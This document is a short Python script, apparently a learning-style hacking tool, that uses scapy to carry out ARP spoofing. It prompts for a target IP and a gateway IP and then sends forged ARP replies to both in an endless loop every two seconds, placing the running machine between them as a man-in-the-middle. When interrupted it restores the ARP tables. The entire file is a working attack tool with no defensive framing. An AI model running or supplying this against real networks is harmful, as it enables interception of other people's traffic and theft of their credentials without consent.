#!/usr/bin/env python
import time
import scapy.all as scapy

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    answered_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = input("Enter the target ip: ")
gateway_ip = input("Enter the gateway ip: ")


try:
    packets_sent = 0
    while True:
        arp_spoof(target_ip, gateway_ip)
        arp_spoof(gateway_ip, target_ip)
        packets_sent += 2
        print("\r[+] Packets sent: " + str(packets_sent), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL+C ... Restoring ARP tables!... Please wait...\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

